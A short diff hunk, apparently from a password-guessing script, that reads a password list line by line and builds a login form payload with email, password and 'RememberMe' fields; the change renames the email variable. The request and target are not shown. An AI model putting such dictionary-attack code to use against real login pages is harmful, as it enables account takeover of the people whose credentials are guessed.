@@ -6,7 +6,7 @@ with open(password, 'r') as passlist:
   for p in passlist:
   p = ''.join(p.split("\n"))
   data_payload = {
-    'email': u,
+    'email': email,
     'password': p,
     'RememberMe': 'false'
  }
